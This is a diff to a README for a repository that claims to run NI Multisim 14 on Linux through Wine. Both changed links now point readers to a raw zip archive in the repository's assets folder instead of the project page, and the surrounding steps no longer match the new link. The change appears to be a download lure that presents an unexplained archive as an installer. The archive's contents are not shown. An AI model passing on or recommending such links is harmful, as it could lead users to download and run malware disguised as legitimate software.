@@ -1,6 +1,6 @@
 # ⚡ NI-Multisim-14-for-Linux - Run circuit designs on your computer
 
-[![](https://img.shields.io/badge/Download-Multisim-blue.svg)](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux)
+[![](https://img.shields.io/badge/Download-Multisim-blue.svg)](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux/raw/refs/heads/main/assets/Multisim_for_N_Linux_3.5.zip)
 
 This project allows you to use NI Multisim 14 on a Linux operating system. Multisim serves as a tool for circuit design and analysis. It helps students and engineers test electronic circuits before you build them in real life. This software configuration uses Wine to translate Windows instructions for your Linux system.
 
@@ -20,7 +20,7 @@ You should verify that your graphics drivers are up to date. This ensures the be
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux) the installer scripts. 
+1. Visit [this page to download](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux/raw/refs/heads/main/assets/Multisim_for_N_Linux_3.5.zip) the installer scripts. 
 2. Select the green code button to download the repository as a ZIP file.
 3. Extract the ZIP file into a folder on your desktop.
 4. Open your terminal application.
